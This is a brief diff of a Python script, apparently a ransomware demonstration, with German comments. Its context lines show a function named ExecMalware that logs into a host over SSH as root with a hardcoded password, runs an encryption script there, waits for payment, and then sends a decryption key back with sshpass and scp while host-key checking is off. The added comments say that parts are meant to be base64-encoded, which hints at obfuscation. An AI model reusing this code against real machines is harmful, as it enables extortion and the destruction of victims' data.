@@ -8,11 +8,11 @@ import paramiko
 import subprocess
 
 def ExecMalware():
-
+    
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect('172.17.0.3', username="root", password="root")
-
+    #eigentlich base64 codiert
     time.sleep(1)
     stdin, stdout, stderr = client.exec_command('cd ../ && python3 encrypt.py')
 
@@ -37,6 +37,7 @@ def wait_for_payment(file_path, timeout=60):
     time.sleep(3)
     print("---------")
     print("Schicke Decryption + key")
+    #base64 codiert
     ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root/../"
     os.system(ostring)
     print("key verschickt")
